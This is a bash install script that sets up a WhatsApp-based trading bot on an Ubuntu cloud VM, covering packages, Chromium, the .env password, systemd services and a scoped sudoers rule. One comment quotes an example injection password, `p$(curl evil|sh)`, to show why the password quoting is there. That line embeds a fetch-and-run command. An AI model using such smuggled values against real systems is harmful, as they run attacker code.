#!/bin/bash
# install.sh — set up the Trade Flow bot on a fresh Ubuntu VM
# (target: Oracle Cloud Always Free ARM instance, Ubuntu 24.04).
#
# 1. Copy this project to ~/wa-trade-bot on the VM
#    (git clone your private repo, or scp a tarball).
# 2. Run: bash ~/wa-trade-bot/deploy/install.sh
# 3. Open http://<vm-public-ip>:3001 and finish setup in the UI.
set -euo pipefail

BOT_DIR="$HOME/wa-trade-bot"
cd "$BOT_DIR"

echo "==> system packages"
sudo apt-get update -qq
sudo apt-get install -y -qq curl git python3 python3-requests

if ! command -v node >/dev/null || [ "$(node -p 'process.versions.node.split(".")[0]')" -lt 20 ]; then
  echo "==> node 20"
  curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
  sudo apt-get install -y -qq nodejs
fi

echo "==> chromium (snap; whatsapp-web.js needs a real browser on ARM64)"
if ! snap list chromium >/dev/null 2>&1; then
  sudo snap install chromium
fi
# NOTE: PUPPETEER_EXECUTABLE_PATH must point at the real binary, NOT
# /snap/bin/chromium — snap's launcher refuses to run from inside a systemd
# service ("not a snap cgroup"), which breaks both pairing and the hourly pull.
CHROME_BIN=/snap/chromium/current/usr/lib/chromium-browser/chrome
sudo apt-get install -y -qq libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 \
  libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxfixes3 libxrandr2 \
  libgbm1 libasound2t64 libpango-1.0-0 libcairo2 libx11-xcb1

echo "==> timezone -> America/Los_Angeles (run window is ET-based: 08:30-17:00 + midnight)"
sudo timedatectl set-timezone America/Los_Angeles || true

echo "==> npm install"
npm install --no-audit --no-fund

echo "==> .env"
if [ ! -f .env ]; then
  cp .env.example .env
  if [ -z "${ADMIN_PASSWORD:-}" ]; then
    read -rsp "Choose an admin password for the setup UI: " ADMIN_PASSWORD; echo
  fi
  # portable in-place set of ADMIN_PASSWORD
  python3 - "$ADMIN_PASSWORD" <<'EOF'
import sys, re
pw = sys.argv[1]
# Quote like server.js envQuote(): double-quote values containing whitespace
# or shell-special chars, escaping \, ", $, and ` — so bash (run-cycle.sh
# sources .env), systemd EnvironmentFile, and server.js all read the same
# value, and a password like `p$(curl evil|sh)` can never execute.
if re.search(r'[\s"\'`$\\#]', pw):
    pw = ('"' + pw.replace('\\', '\\\\').replace('"', '\\"')
          .replace('$', '\\$').replace('`', '\\`') + '"')
p = ".env"
s = open(p).read()
s = re.sub(r"^ADMIN_PASSWORD=.*$", "ADMIN_PASSWORD=" + pw, s, flags=re.M)
open(p, "w").write(s)
EOF
  chmod 600 .env
fi
# Make sure the browser path is set even if .env predates it (see note above).
if ! grep -q '^PUPPETEER_EXECUTABLE_PATH=' .env; then
  printf 'PUPPETEER_EXECUTABLE_PATH=%s\n' "$CHROME_BIN" >> .env
fi

echo "==> systemd units"
for f in wa-trade-bot.service wa-trade-bot-cycle.service wa-trade-bot-cycle.timer wa-trade-listener.service; do
  sed "s|%HOME%|$HOME|g" "deploy/$f" | sudo tee "/etc/systemd/system/$f" >/dev/null
done
sudo systemctl daemon-reload
sudo systemctl enable --now wa-trade-bot.service
sudo systemctl enable --now wa-trade-bot-cycle.timer
sudo systemctl enable --now wa-trade-listener.service
# Let the hourly cycle (running as ubuntu) restart the listener if its
# heartbeat goes stale — without this the watchdog in run-cycle.sh can't act.
echo "ubuntu ALL=(ALL) NOPASSWD: /bin/systemctl start wa-trade-listener, /bin/systemctl stop wa-trade-listener, /bin/systemctl restart wa-trade-listener" | sudo tee /etc/sudoers.d/wa-trade-listener >/dev/null
sudo chmod 440 /etc/sudoers.d/wa-trade-listener

IP=$(curl -s --max-time 5 ifconfig.me || echo "<vm-public-ip>")
echo
echo "==> done. Open http://${IP}:3001 and finish setup:"
echo "    1. link WhatsApp (pairing code),  2. save Gemini + Supabase keys,"
echo "    3. run supabase/schema.sql once in the Supabase SQL editor,"
echo "    4. hit 'Run a cycle now'."
echo "If the page doesn't load, open port 3001 in the VM's security list / firewall."
